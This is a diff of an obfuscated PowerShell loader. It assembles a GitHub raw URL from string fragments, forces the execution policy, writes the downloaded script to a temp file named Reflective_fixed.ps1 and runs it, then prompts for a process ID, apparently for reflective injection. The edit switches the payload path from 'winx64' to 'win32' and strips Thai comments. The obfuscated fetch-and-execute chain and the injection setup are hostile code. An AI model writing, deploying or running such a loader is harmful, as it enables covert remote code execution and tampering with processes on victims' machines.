@@ -6,7 +6,7 @@ $_0x91A = @(
 ".com/CONNERZZZ",
 "/CONNERZZZ/refs",
 "/heads/main/",
-"winx64"
+"win32"
 ) -join ""
 
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
@@ -40,12 +40,8 @@ $_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
-
-# 1. ล้างหน้าจอ (ขึ้นหน้าใหม่)
 Clear-Host 
-
-# 2. รับค่าจากผู้ใช้งาน
- $_0x2AA = Read-Host (@("Enter"," PID") -join "")
+$_0x2AA = Read-Host (@("Enter"," PID") -join "")
 
 start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
